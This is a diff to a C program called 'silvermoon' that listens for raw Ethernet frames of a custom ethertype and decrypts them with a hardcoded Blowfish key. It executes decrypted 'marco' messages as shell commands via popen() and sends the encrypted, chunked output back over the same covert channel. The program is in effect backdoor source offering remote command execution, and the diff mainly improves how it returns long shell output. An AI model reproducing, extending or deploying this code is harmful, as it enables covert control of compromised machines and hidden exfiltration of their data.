@@ -13,7 +13,7 @@
 #define B64_DEF_LINE_SIZE   72
 #define B64_MIN_LINE_SIZE    4
 #define N               16
-// gcc silvermoon.c -o silvermoon.exe -lws2_32 -lwpcap
+// gcc -g silvermoon.c -o silvermoon.exe -lws2_32 -lwpcap
 void ProcessPacket (u_char* , int);
 void print_ethernet_header (u_char*);
 void PrintData (u_char* , int);
@@ -42,13 +42,13 @@ void CreatePacket(unsigned char* UserData,unsigned int UserDataLen) {
     return;
 }
 //void SendPacket(pcap_if_t* Device) {
-void SendPacket() {
+void SendPacket(int packetlen) {
     char Error[256];
     //pcap_t* t;
     //t = pcap_open(Device->name,100,PCAP_OPENFLAG_PROMISCUOUS,20,NULL,Error);
     //pcap_sendpacket(t,FinalPacket,UserDataLen + 42);
     //pcap_sendpacket(t,FinalPacket,strlen(FinalPacket));
-    pcap_sendpacket(fp,FinalPacket,strlen(FinalPacket));
+    pcap_sendpacket(fp,FinalPacket,packetlen);
     //pcap_close(t); // we dont close now, because we are still listening on it concurrently, i hope
 }
 // BLEWS FLOSH
@@ -495,25 +495,31 @@ void Blowfish_Init(BLOWFISH_CTX *ctx, unsigned char *key, int keyLen) {
 // BOSS SIXTYFOUR - or - I DON'T NEED INSTRUCTIONS TO KNOW HOW TO ROCK
 static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 static const char cd64[]="|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
-static void blowfishcbc(unsigned char *ar, int mode) { // message string, 0 for encode, 1 for decode
+static void blowfishcbc(unsigned char *ar, int mode, int arsize) { // message string, 0 for encode, 1 for decode
 	unsigned long L, R;
 	BLOWFISH_CTX dtx;
 	Blowfish_Init (&dtx, (unsigned char*)"allcalma", 8);
 	int beans = 0;
-	int arsize;
-	arsize = strlen(ar);
+	//int arsize;
+	//arsize = strlen(ar);
 	while (beans < arsize) {
 		L = 0;
 		R = 0;
 		int n;
 		for (n = 0; n < 8; n++) {
 			if (n < 4) {
+				if (beans <= 8 || beans >= (arsize-16)) {
+					printf("%02x",ar[beans + n]);
+				}
 				L += (int)ar[beans + n] & 0xff;
 				if (n != 3) {
 					L <<= 8;
 				}
 			}
 			else {
+				if (beans <= 8 || beans >= (arsize-16)) {
+					printf("%02x",ar[beans + n]);
+				}
 				R += (int)ar[beans + n] & 0xff;
 				if (n != 7) {
 					R <<= 8;
@@ -535,10 +541,13 @@ static void blowfishcbc(unsigned char *ar, int mode) { // message string, 0 for 
 		ar[beans + 6] = (R >> 8) & 0xff;
 		ar[beans + 7] = R & 0xff;
 		
-		//printf("L %08lX R %08lX\n", L, R);
+		if (beans <= 8 || beans >= (arsize-16)) {
+			printf(" L %08lX R %08lX\n", L, R);
+		}
 		beans += 8;
 	}
-	ar[beans] = '\0';
+	//beans++;
+	//ar[beans] = '\0';
 }
 static void encodeblock(unsigned char *in, unsigned char *out, int len) {
     out[0] = (unsigned char) cb64[ (int)(in[0] >> 2) ];
@@ -547,33 +556,39 @@ static void encodeblock(unsigned char *in, unsigned char *out, int len) {
     out[3] = (unsigned char) (len > 2 ? cb64[ (int)(in[2] & 0x3f) ] : '=');
 }
 static void encode(unsigned char *ar, int size) {
-    unsigned char in[3];
-    unsigned char out[4];
+    unsigned char in[4];
+    unsigned char out[5];
     unsigned char result[size * 2];
     int j, i, len, k;
 	k = 0;
 	j = 0;
-
+	//size += 3; // I don't know why, but lets try this
     *in = (unsigned char) 0;
     *out = (unsigned char) 0;
     //printf("J: %d\nSize: %d\n", j, size);
     while (j < size) {
         len = 0;
         for (i = 0; i < 3; i++) {
-		//printf("J2: %d\nSize2: %d\n", j, size);
-		in[i] = (unsigned char) ar[j];
-		//printf("CHAR: %c\n", in[i]);
-		if (j + i > size) {
+		if (j + i > size+1) {
+			//break;
 			in[i] = (unsigned char) 0;
 		}
 		else {
+			in[i] = (unsigned char) ar[j];
 			len++;
+		}
+		if (j < 6 || j > (size - 11)) {
+			printf("J2: %d I2: %d Size2: %d ", j, i, size);
+			printf("%c [%02x] ", in[i], in[i]);
 		}
 		j++;
         }
         if (len > 0) {
             encodeblock(in, out, len);
-		//printf("OUT: %s\n", out);
+		if (j < 7 || j > (size - 11)) {
+			out[4] = '\0';
+			printf("OUT: %s\n", out);
+		}
             for (i = 0; i < 4; i++) {
 		result[k] = out[i];
 		k++;
@@ -584,6 +599,7 @@ static void encode(unsigned char *ar, int size) {
     int copyover;
     int resultlen;
     resultlen = strlen(result);
+    //resultlen -= 4; // to get rid of the +3 from above, for some reason
     for (copyover = 0; copyover < resultlen; copyover++) {
 		if (result[copyover] == '=') {
 			ar[copyover] = '\0';
@@ -592,7 +608,7 @@ static void encode(unsigned char *ar, int size) {
 			ar[copyover] = result[copyover];
 		}
     }
-    ar[copyover] = '\0';
+    //ar[copyover] = '\0';
     //printf("B64ENCar: %s\nB64ENCres: %s\n", ar, result);
 }
 static void decodeblock(unsigned char *in, unsigned char *out) {
@@ -639,8 +655,8 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 	result[k] = '\0';
 	//printf("Crypt string: %s\n", result);
 
-	blowfishcbc(result, 1);
-	printf("Dec message: %s\n", result);
+	blowfishcbc(result, 1, k);
+	//printf("Dec message: %s\n", result);
 	if (result[0] == 'm' && result[1] == 'a' && result[2] == 'r' && result[3] == 'c' && result[4] == 'o') {
 		unsigned char commandbuf[k];
 		int cb;
@@ -650,14 +666,16 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 		commandbuf[cb] = '\0';
 		//printf("CommandBuffer:%s-\n",commandbuf);
 		int messagebuilder = 0;
-		char message[5000];
-		char bfr[5000];
+		char message[50000];
+		char bfr[50000];
 		FILE * fp;
 		if((fp=popen(commandbuf, "r")) == NULL) {
 		   printf("Error executing command buffer\n");
 		}
-		while(fgets(bfr,5000,fp) != NULL){
-			printf("BFR:%s\n", bfr);
+		printf("\n");
+		message[messagebuilder] = '\x0A'; // prepend with a newline for good formatting on shell responses
+		messagebuilder++;
+		while(fgets(bfr,50000,fp) != NULL){
 			int sure;
 			int bfrlen;
 			bfrlen = strlen(bfr);
@@ -666,69 +684,130 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 				messagebuilder++;
 			}
 		}
-		message[messagebuilder] = '\0';
-		unsigned char commandcode[3] = "\xF7\0"; // 7 is our command, F gets chopped off later, we use F so that polo[0] isn't null later
+		while (messagebuilder % 8 != 0) {
+			message[messagebuilder] = '\0';
+			messagebuilder++;
+		}
+		messagebuilder--;
+		//int nullkiller;
+		//nullkiller = strlen(message);
+		//printf("Messagelen: %d\n", nullkiller);
+		int mtuchunk = 0;
 		unsigned char nick[16] = "Polo\0";
 		unsigned char tripcode[7] = "Zy9XUQ\0";
-		//unsigned char message[5100] = "polo\0";
-		blowfishcbc(message, 0); // encode message
-		encode(message, strlen(message));
 		unsigned char lineterminator[3] = "\xFF\0"; // FF is a byte of padding to shift right, randomize later
-		unsigned char polo[5100];
-		int shiftprep = 0;
-		int currstringlen;
-		int poloiterator;
-		// add commandcode
-		currstringlen = strlen(commandcode);
-		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
-			polo[shiftprep] = commandcode[poloiterator];
+		unsigned char messagechunk[1250];
+		unsigned char commandcode[3];
+		while ((mtuchunk * 896) < messagebuilder) {
+			int chunker;
+			int currentchunk = mtuchunk * 896;
+			//int currentchunkmax = (mtuchunk + 1) * 896;
+			for(chunker = 0; chunker < 896; chunker++) {
+				if ((currentchunk + chunker) > messagebuilder) {
+					break;
+				}
+				else {
+					messagechunk[chunker] = message[currentchunk + chunker];
+				}
+			}
+			//while ((currentchunk + chunker) % 8 != 0) { // pad final message packet out to mutliples of 8 using nulls?
+			//	messagechunk[chunker] = '\0';
+			//	chunker++;
+			//}
+			//messagechunk[chunker] = '\0';
+			//chunker++;
+			printf("PREBFM%sEND\n",messagechunk);
+			blowfishcbc(messagechunk, 0, chunker); // encode message, this returns null characters sometimes, so we need to mark the size beforehand
+			printf("BFMessagechunklen: %d\n", chunker);
+			int bfm;
+			printf("\nPREENC\n");
+			for (bfm = 0; bfm < chunker; bfm++) {
+				if (bfm < 20 || bfm > (chunker - 20)) {
+					printf("(%02x)",messagechunk[bfm]);
+				}
+			}
+			printf("\nPREENCEND\n");
+			//chunker++;
+			encode(messagechunk, chunker);
+			//printf("B64Messagelen: %d\n", strlen(messagechunk));
+			//printf("Message: %s\n", messagechunk);
+			if (((mtuchunk + 1) * 896) < messagebuilder) {
+				commandcode[0] = '\xF7'; // 7 is our messagebuffer command, F gets chopped off later, we use F so that polo[0] isn't null later
+				commandcode[1] = '\0'; // 7 is our messagebuffer command, F gets chopped off later, we use F so that polo[0] isn't null later
+			}
+			else {
+				commandcode[0] = '\xF0'; // 0 is our message command, F gets chopped off later, we use F so that polo[0] isn't null later
+				commandcode[1] = '\0'; // 0 is our message command, F gets chopped off later, we use F so that polo[0] isn't null later
+			}
+			unsigned char polo[1800];
+			int shiftprep = 0;
+			int currstringlen;
+			int poloiterator;
+			// add commandcode
+			currstringlen = strlen(commandcode);
+			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+				polo[shiftprep] = commandcode[poloiterator];
+				shiftprep++;
+			}
+			// add nick
+			currstringlen = strlen(nick);
+			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+				polo[shiftprep] = nick[poloiterator];
+				shiftprep++;
+			}
+			// add tripcode
+			currstringlen = strlen(tripcode);
+			polo[shiftprep] = ' ';
 			shiftprep++;
-		}
-		// add nick
-		currstringlen = strlen(nick);
-		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
-			polo[shiftprep] = nick[poloiterator];
+			polo[shiftprep] = '[';
 			shiftprep++;
-		}
-		// add tripcode
-		currstringlen = strlen(tripcode);
-		polo[shiftprep] = ' ';
-		shiftprep++;
-		polo[shiftprep] = '[';
-		shiftprep++;
-		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
-			polo[shiftprep] = tripcode[poloiterator];
+			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+				polo[shiftprep] = tripcode[poloiterator];
+				shiftprep++;
+			}
+			polo[shiftprep] = ']';
 			shiftprep++;
-		}
-		polo[shiftprep] = ']';
-		shiftprep++;
-		polo[shiftprep] = ' ';
-		shiftprep++;
-		// add message
-		currstringlen = strlen(message);
-		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
-			polo[shiftprep] = message[poloiterator];
+			polo[shiftprep] = ' ';
 			shiftprep++;
+			// add message
+			currstringlen = strlen(messagechunk);
+			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+				polo[shiftprep] = messagechunk[poloiterator];
+				shiftprep++;
+			}
+			// add lineterminator
+			currstringlen = strlen(lineterminator);
+			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+				polo[shiftprep] = lineterminator[poloiterator];
+				shiftprep++;
+			}
+			polo[shiftprep] = '\0';
+			
+			/*  i guess we dont actually do this again, but we can add it later
+			blowfishcbc(polo, 0, shiftprep); // encode nick, trip, and encoded message
+			*/
+			//printf("\nPOLO:%s\n", polo);
+			shift_right(polo, (shiftprep + 1), 3);
+			int shiftback;
+			for (shiftback = 0;shiftback < shiftprep;shiftback++) {
+				polo[shiftback] = polo[shiftback + 1];
+			}
+			polo[shiftback-1] = '\0';
+			int poloprint;
+			//printf("\nPOLOPRINT\n");
+			//for (poloprint = 0; poloprint < shiftprep; poloprint++) {
+			//	printf("[%02x]", polo[poloprint]);
+			//}
+			//printf("\nENDPOLOPRINT\n");
+			CreatePacket(polo, shiftback);
+			//printf("\nFINALPRINT\n");
+			//for (poloprint = 0; poloprint < shiftback; poloprint++) {
+			//	printf("[%02x]", FinalPacket[poloprint]);
+			//}
+			//printf("\nENDFINALPRINT\n");
+			SendPacket(shiftback + 13); // because createpacket adds 12 of mac and 2 of etype, -1 for the null
+			mtuchunk++;
 		}
-		// add lineterminator
-		currstringlen = strlen(lineterminator);
-		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
-			polo[shiftprep] = lineterminator[poloiterator];
-			shiftprep++;
-		}
-		polo[shiftprep] = '\0';
-		
-		/*  i guess we dont actually do this again, but we can add it later
-		blowfishcbc(polo, 0); // encode nick, trip, and encoded message
-		*/
-		
-		shift_right(polo, strlen(polo), 3);
-		int shiftback;
-		for (shiftback = 0;shiftback < strlen(polo);shiftback++) {
-			polo[shiftback] = polo[shiftback + 1];
-		}
-		CreatePacket(polo, strlen(polo));
-		SendPacket();
 	}
 
 	return(retcode);
@@ -825,7 +904,8 @@ ETHER_HDR *ethhdr;
 u_char *data;
 
 int main() {
-  unsigned long L = 1, R = 2;
+printf("PID: %d\n\n",getpid());
+	unsigned long L = 1, R = 2;
   BLOWFISH_CTX ctx;
 
   Blowfish_Init (&ctx, (unsigned char*)"allcalma", 8);
@@ -841,6 +921,7 @@ int main() {
   else
 	  printf("Test decryption failed.\n");
   // ---------------------------
+
     u_int i, res , inum ;
     u_char errbuf[PCAP_ERRBUF_SIZE], buffer[100];
     u_char *pkt_data;
@@ -913,7 +994,7 @@ void ProcessPacket(u_char* Buffer, int Size) {
     ++total;
 
     if (ntohs(ethhdr->type) == 0x0E0E) {
-	    printf("\nEthertype: 0E0E\n");
+	    printf("\n----------------------------------------------------------------------------------------------------------------\nEthertype: 0E0E\n");
 	    Buffer = (Buffer + 14); // skip 12 for mac addresses and 2 for ethertype
 	    Size = (Size - 14);
 	    PrintData(Buffer , Size);
@@ -927,25 +1008,6 @@ void PrintData (u_char* data , int Size) { //    Print the hex values of the dat
 		printf("c: Message\n");
 		strip_nick_trip(data, Size);
 		decode(data, strlen(data));
-	    /*
-		RawPacket RP;
-
-		RP.CreatePacket(MACStringToBytes(SourceMAC),
-		di.GatewayPhysicalAddress,
-		inet_addr(SourceIP),
-		inet_addr(DestinationIP),
-		atoi(SourcePort),
-		atoi(DestinationPort),
-		(UCHAR*)DataString,
-		strlen(DataString));
-
-		RP.SendPacket(ChosenDevice);
-	    */
-		////npmessagehdr = (NOPRO_HDR *)(data + sizeof(NOPRO_HDR));
-		//npmessagehdr = (NOPRO_MSGHDR *)(noprohdr->message);
-		// from here i guess we prototype out a new struct for each command type
-		//retcode = encode( infile, outfile, linesize );
-		//retcode = decode( infile, outfile ); // decode here, since we are receiving the message
             break;
 
             case 1: //Join
@@ -972,8 +1034,10 @@ void PrintData (u_char* data , int Size) { //    Print the hex values of the dat
 		    printf("c: Shell Send\n");
             break;
 	    
-            case 7: //Shell Response
-		    printf("c: Shell Response\n");
+            case 7: //Message Buffer
+		printf("c: Message Buffer\n");
+		strip_nick_trip(data, Size);
+		decode(data, strlen(data));
             break;
  
             default:
